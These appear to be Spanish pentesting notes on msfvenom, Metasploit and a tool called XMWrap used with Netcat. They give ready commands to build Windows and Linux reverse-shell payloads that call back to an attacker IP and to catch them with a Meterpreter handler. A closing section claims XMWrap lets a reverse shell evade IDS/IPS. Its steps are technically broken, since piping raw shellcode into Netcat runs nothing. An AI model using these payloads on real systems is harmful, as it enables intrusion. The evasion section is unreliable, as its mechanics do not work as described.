
# Msfvenom

> **Msfvenom** es una herramienta de [Metasploit](../../Herramientas/Metasploit) que permite generar y personalizar [Payloads](Payload.md) para exploits.

## Instalación

```bash
sudo apt update && sudo apt install metasploit-framework
```

## Uso básico

Generar un payload para una shell inversa en Windows:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
```

Generar un payload para Linux en formato ELF:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

---

# Metasploit

>**Metasploit** es un framework de pentesting que permite la explotación de vulnerabilidades, gestión de sesiones y generación de payloads.

## Instalación

```bash
sudo apt update && sudo apt install metasploit-framework
```

## Uso básico

Iniciar Metasploit (recomendado para primera vez):

```bash
msfdb run
```

Iniciar Metasploit:

```bash
msfconsole
```

Buscar un exploit:

```bash
search exploit_name
```

Cargar un exploit:

```bash
use exploit/path/to/exploit
```

Configurar opciones del exploit:

```bash
set RHOST 192.168.1.10
set LHOST 192.168.1.100
```

Ejecutar el exploit:

```bash
exploit
```

---

## Uso en relación a Payloads

Metasploit permite configurar y ejecutar payloads generados con **msfvenom**. Un ejemplo de ejecución con Meterpreter:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

Con esto, cuando la víctima ejecute el payload generado con **msfvenom**, se abrirá una sesión **Meterpreter** en Metasploit.

---

# XMWrap y su uso con Netcat

### ¿Qué es XMWrap?

> **XMWrap** es una utilidad que permite encapsular flujos de datos en **XML**, facilitando la transmisión de información estructurada entre procesos o redes.

En ciberseguridad, **XMWrap** se puede utilizar para ofuscar la comunicación de shells interactivas, dificultando su detección por sistemas de monitoreo.

---

## Uso de XMWrap con Netcat para recibir un payload de shell interactiva

Podemos utilizar **XMWrap** junto con **Netcat** para recibir una shell remota ofuscada en XML y decodificarla en el destino. A continuación, se muestra un ejemplo práctico:

### 1. Generar el payload con msfvenom

Para generar un **payload de shell inversa en formato RAW**, utilizamos **msfvenom**:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.raw
```

> **Explicación:**
> 
> - `-p linux/x64/shell_reverse_tcp` → Payload de shell inversa para Linux (64 bits).
>     
> - `LHOST=192.168.1.100` → IP del atacante.
>     
> - `LPORT=4444` → Puerto en el que recibiremos la conexión.
>     
> - `-f raw` → Formato sin codificar (RAW) para encapsularlo con XMWrap.
>

### 2. Enviar la shell con XMWrap

En la máquina víctima, ejecutamos:

```
cat shell.raw | xmwrap | nc 192.168.1.100 4444
```

> **Explicación:**
> 
> - `cat shell.raw` → Lee el payload generado.
>     
> - `xmwrap` → Encapsula los datos en formato XML.
>     
> - `nc 192.168.1.100 4444` → Envía la salida a la IP del atacante por el puerto 4444 con **Netcat**.
>     

---

### 3. Recibir la shell en la máquina atacante

Para recibir la conexión, usamos **Netcat** y desempaquetamos la información con **XMWrap**:

```
nc -lvp 4444 | xmunwrap
```

> **Explicación:**
> 
> - `nc -lvp 4444` → Escucha en el puerto 4444 en modo detallado (`-v` para verbose y `-p` para puerto).
>     
> - `| xmunwrap` → Decodifica la salida de **XMWrap**, obteniendo la shell interactiva limpia.
>     

Con esto, logramos obtener una **shell inversa interactiva**, evitando detección por IDS/IPS que analicen patrones tradicionales de tráfico de Netcat.

---
